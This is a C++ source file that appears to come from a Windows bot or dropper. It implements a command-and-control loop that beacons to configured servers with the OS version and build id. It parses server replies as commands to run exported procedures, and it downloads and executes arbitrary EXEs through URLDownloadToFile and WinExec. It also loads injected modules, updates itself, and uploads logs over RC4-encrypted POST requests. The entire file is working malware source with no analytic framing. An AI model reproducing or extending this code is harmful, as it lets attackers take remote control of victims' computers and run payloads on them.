#include <intrin.h>
#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <Urlmon.h>

#include "dropper.h"
#include "server.h"
#include "protect.h"
#include "config.h"
#include "modules.h"

#include "utils.h"

CHAR g_CurrentServer[MAX_PATH] = {0};

// Commands
//----------------------------------------------------------------------------------------------------------------------------------------------------

DRPEXPORT BOOLEAN DownloadRunExeUrl(DWORD TaskId, PCHAR ServerUrl, PCHAR FileUrl)
{
	/*WINET_LOADURL LoadUrl = {0};
	DWORD dwLastError;
	PVOID Buffer;

	LoadUrl.pcMethod = "GET";
	LoadUrl.pcUrl = FileUrl;
	if (Buffer = WinetLoadUrl(&LoadUrl)) 
	{
		Result = Utils::WriteFileAndExecute(Buffer, LoadUrl.dwBuffer);
		dwLastError = GetLastError();

		free(Buffer);
	}

	if (TaskId) Server::SendServerAnswer(TaskId, ServerUrl, Result, dwLastError);*/

	BOOLEAN Result = TRUE;
	CHAR chTempPath[MAX_PATH];
	CHAR chTempName[MAX_PATH];

	GetTempPath(sizeof(chTempPath), chTempPath);
	GetTempFileName(chTempPath, NULL, 0, chTempName);
	lstrcat(chTempName, ".exe");

	if (SUCCEEDED(URLDownloadToFile(NULL, FileUrl, chTempName, 0, NULL)))
	{
		if (WinExec(chTempName, 0) < 31)
		{
			DbgMsg(__FUNCTION__"(): WinExec: %x\r\n", GetLastError());
		}
	}
	else
	{
		DbgMsg(__FUNCTION__"(): URLDownloadToFile: %x\r\n", GetLastError());
	}

	if (TaskId) Server::SendServerAnswer(TaskId, ServerUrl, 1, 0);

	return Result;
}

DRPEXPORT BOOLEAN DownloadRunExeId(DWORD TaskId, PCHAR ServerUrl, DWORD FileId)
{
	BOOLEAN Result = FALSE;
	DWORD dwLastError;
	DWORD Size;
	PVOID Buffer;

	ServerUrl = g_CurrentServer;


	if (Buffer = Server::DownloadFileById(FileId, ServerUrl, &Size))
	{
		SetLastError(0);
		Result = Utils::WriteFileAndExecute(Buffer, Size);
		dwLastError = GetLastError();

		free(Buffer);
	}

	if (TaskId) Server::SendServerAnswer(TaskId, ServerUrl, Result, dwLastError);

	return Result;
}

DRPEXPORT BOOLEAN DownloadRunModId(DWORD TaskId, PCHAR ServerUrl, DWORD ModuleId, PCHAR ModuleName, DWORD ModuleVersion, PCHAR Inject, PCHAR ConnectedWithModuleName, DWORD RunMode, PCHAR Args)
{
	BOOLEAN Result = FALSE;
	DWORD Size;
	PVOID Buffer;
	DWORD dwLastError;

	ServerUrl = g_CurrentServer;

	if (Config::ReadInt(CFG_DCT_MODVER_SECTION, ModuleName) >= ModuleVersion) Result = TRUE;

	if (!Result)
	{
		if (Buffer = Server::DownloadFileById(ModuleId, ServerUrl, &Size))
		{
			Result = Modules::WriteModuleAndLoad(Buffer, Size, ModuleName, ModuleVersion, Inject, ConnectedWithModuleName, RunMode, Args);
			dwLastError = GetLastError();

			free(Buffer);
		}
	}

	if (TaskId) Server::SendServerAnswer(TaskId, ServerUrl, Result, dwLastError);

	return Result;
}

DRPEXPORT BOOLEAN DownloadUpdateMain(DWORD TaskId, PCHAR ServerUrl, DWORD FileId, DWORD FileVersion)
{
	BOOLEAN Result = FALSE;
	DWORD Size;
	PVOID Buffer;
	DWORD dwLastError;

	ServerUrl = g_CurrentServer;

	if (Config::ReadInt(CFG_DCT_MAIN_SECTION, CFG_DCT_MAIN_VERSION) <= FileVersion)
	{
		if (Buffer = Server::DownloadFileById(FileId, ServerUrl, &Size))
		{
			if (Result = Protect::UpdateMain(Buffer, Size))
			{
				Config::WriteInt(CFG_DCT_MAIN_SECTION, CFG_DCT_MAIN_VERSION, FileVersion);
			}

			dwLastError = GetLastError();

			free(Buffer);
		}
		else
		{
			DbgMsg(__FUNCTION__"(): e2\r\n");
		}
	}
	else
	{
		DbgMsg(__FUNCTION__"(): e1\r\n");
	}

	if (TaskId) Server::SendServerAnswer(TaskId, ServerUrl, Result, dwLastError);

	return Result;
}

DRPEXPORT BOOLEAN UnloadModule(DWORD TaskId, PCHAR ServerUrl, PCHAR ModuleName)
{
	DWORD dwLastError;
	bool result = Modules::ModuleUnload(ModuleName);
	dwLastError = GetLastError();

	if (TaskId) Server::SendServerAnswer(TaskId, ServerUrl, result, dwLastError);

	return result;
}

DRPEXPORT BOOLEAN WriteConfigString(DWORD TaskId, PCHAR ServerUrl, PCHAR Section, PCHAR Variable, PCHAR String)
{
	return Config::WriteString(Section, Variable, String);
}

DRPEXPORT DWORD SendLogs(DWORD TaskId, PCHAR ServerUrl)
{
	PVOID Buffer;
	PVOID Logs;
	DWORD Len;
	BOOLEAN b;

	if (Logs = Utils::ReadLogsFromFile(&Len))
	{
		if (Buffer = Server::SendRequest(ServerUrl, SRV_TYPE_LOG, (PCHAR)Logs, Len, FALSE, NULL, &b)) free(Buffer);

		free(Logs);
	}

	return 0;
}


// Server
//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID Server::SendLogsToServer()
{
	Config::ReadConfig();

	CHAR Buffer[MAX_PATH*4];

	if (Config::ReadString(CFG_DCT_MAIN_SECTION, CFG_DCT_MAIN_SRVURLS, Buffer, RTL_NUMBER_OF(Buffer)))
	{
		PCHAR CfgServerUrls = Buffer;
		PCHAR ServerUrl;

		while (Utils::StringTokenBreak(&CfgServerUrls, ";", &ServerUrl))
		{
			SendLogs(0, ServerUrl);

			free(ServerUrl);
		}
	}
}

VOID Server::SendServerAnswer(DWORD TaskId, PCHAR ServerUrl, BOOLEAN Result, DWORD LastError)
{
	CHAR Answer[MAX_PATH];
	PVOID Buffer;
	DWORD Len;
	BOOLEAN b;

	Len = _snprintf(Answer, RTL_NUMBER_OF(Answer), "tid=%d&ta=%s-%x", TaskId, Result ? "OK" : "Err", Result ? 0 : LastError);

	if (Buffer = Server::SendRequest(ServerUrl, SRV_TYPE_TASKANSWER, Answer, Len, FALSE, NULL, &b)) free(Buffer);
}

PVOID Server::DownloadFileById(DWORD FileId, PCHAR ServerUrl, PDWORD pSize)
{
	CHAR Request[MAX_PATH];
	DWORD Len;
	BOOLEAN b;

	Len = _snprintf(Request, RTL_NUMBER_OF(Request), "fid=%d", FileId);
	
	return Server::SendRequest(ServerUrl, SRV_TYPE_LOADFILE, Request, Len, FALSE, pSize, &b);
}

PCHAR Server::SendRequest(PCHAR ServerUrl, DWORD Type, PCHAR Request, DWORD RequestLen, BOOLEAN Wait, PDWORD Size, PBOOLEAN pbok)
{
	PVOID Result = NULL;
	WINET_LOADURL LoadUrl = {0};
	PCHAR BotId = Drop::GetBotID();
	CHAR chHost[MAX_PATH] = {0};
	DWORD dwHost = RTL_NUMBER_OF(chHost)-1;
	PCHAR FullRequest;
	
	*pbok = FALSE;
	if (FullRequest = (PCHAR)malloc(RequestLen + 100))
	{
		DWORD Len = _snprintf(FullRequest, RequestLen + 100, "%s|%d|", Drop::GetBotID(), Type);
		
		CopyMemory(FullRequest + Len, Request, RequestLen);
		Len += RequestLen;

		LoadUrl.pcMethod = "POST";
		LoadUrl.pcUrl = ServerUrl;
		if (SUCCEEDED(UrlGetPart(ServerUrl, chHost, &dwHost, URL_PART_HOSTNAME, 0)))
		{
			LoadUrl.dwPstData = Len;
			if (LoadUrl.pvPstData = Utils::UtiCryptRc4M(chHost, dwHost, FullRequest, Len))
			{
				LoadUrl.dwRetry = Config::ReadInt(CFG_DCT_MAIN_SECTION, CFG_DCT_MAIN_SRVRETRY);

				PVOID Buffer = Wait ? WinetLoadUrlWait(&LoadUrl, 2*60) : WinetLoadUrl(&LoadUrl);
				if (Buffer)
				{
					Utils::UtiCryptRc4(BotId, lstrlen(BotId), Buffer, Buffer, LoadUrl.dwBuffer);

					if (RtlEqualMemory(Buffer, "OK\r\n", 4))
					{
						*pbok = TRUE;

						if (LoadUrl.dwBuffer > 4)
						{
							if (Result = malloc(LoadUrl.dwBuffer - 3))
							{
								CopyMemory(Result, (PCHAR)Buffer + 4, LoadUrl.dwBuffer - 4);
								((PCHAR)Result)[LoadUrl.dwBuffer - 4] = 0;
								if (Size) *Size = LoadUrl.dwBuffer - 4;
							}
						}
					}

					free(Buffer);
				}

				free(LoadUrl.pvPstData);
			}
		}

		free(FullRequest);
	}

	return (PCHAR)Result;
}

DWORD Server::ProcessServerAnswer(PCHAR Buffer)
{
	PCHAR CurrentCommand;
	PCHAR Commands = Buffer;

	while (Utils::StringTokenBreak(&Commands, "\r\n", &CurrentCommand))
	{
		CHAR Module[MAX_PATH] = {0};
		CHAR Procedure[MAX_PATH] = {0};
		CHAR Parameters[MAX_PATH] = {0};

		DWORD Scaned = sscanf(CurrentCommand, "%[^.].%[^(](%[^)])", Module, Procedure, Parameters);
		if (Scaned == 3 || Scaned == 2)
		{
			PVOID ModuleBase = !lstrcmpi("main", Module) ? Drop::CurrentImageBase : Modules::ModuleLoad(Module);
			if (ModuleBase)
			{
				DWORD_PTR Result = Utils::ExecExportProcedure(ModuleBase, Procedure, Parameters);

				DbgMsg(__FUNCTION__"(): Command '%s' = %x\r\n", CurrentCommand, Result);
			}
		}

		free(CurrentCommand);
	}

	free(Buffer);

	return 0;
}

BOOLEAN Server::SendReport(PCHAR ServerUrl)
{
	CHAR BuildId[50];
	CHAR WinVer[50];
	CHAR Request[MAX_PATH*4] = {0};
	PCHAR Buffer;
	DWORD Len;
	BOOLEAN pbOK = FALSE;

	Config::ReadString(CFG_DCT_MAIN_SECTION, CFG_DCT_MAIN_BUILDID, BuildId, RTL_NUMBER_OF(BuildId));
	Utils::GetWindowsVersion(WinVer, RTL_NUMBER_OF(WinVer)-1);
	Len = _snprintf(Request, RTL_NUMBER_OF(Request)-1, "os=%s&bid=%s", WinVer, BuildId);
	DbgMsg(__FUNCTION__"(): Request: '%s', length: %u\r\n", Request, Len);
	if (Buffer = Server::SendRequest(ServerUrl, SRV_TYPE_REPORT, Request, Len, TRUE, &Len, &pbOK))
	{
		DbgMsg(__FUNCTION__"(): Buffer '%s'\r\n", Buffer);

		Utils::ThreadCreate(Server::ProcessServerAnswer, Buffer, NULL);
	}

	return pbOK;
}

DWORD Server::ServerLoopThread(PVOID Context)
{
	for (;;)
	{
		CHAR Buffer[MAX_PATH*4];

		if (Config::ReadString(CFG_DCT_MAIN_SECTION, CFG_DCT_MAIN_SRVURLS, Buffer, RTL_NUMBER_OF(Buffer)))
		{
			PCHAR CfgServerUrls = Buffer;
			PCHAR ServerUrl;

			while (Utils::StringTokenBreak(&CfgServerUrls, ";", &ServerUrl))
			{
				if (ServerUrl && ServerUrl[0])
				{
					strcpy(g_CurrentServer, ServerUrl);

					if (Server::SendReport(ServerUrl))
					{
						DbgMsg(__FUNCTION__"(): SendReport '%s' ok\r\n", ServerUrl);

						break;
					}
					else
					{
						DbgMsg(__FUNCTION__"(): SendReport '%s' no answer\r\n", ServerUrl);
					}
				}

				free(ServerUrl);
			}

			DbgMsg(__FUNCTION__"(): Sleep: '%d' min\r\n", Config::ReadInt(CFG_DCT_MAIN_SECTION, CFG_DCT_MAIN_SRVDELAY));

			Sleep(1000 * 60 * Config::ReadInt(CFG_DCT_MAIN_SECTION, CFG_DCT_MAIN_SRVDELAY));
		}
	}

	return 0;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

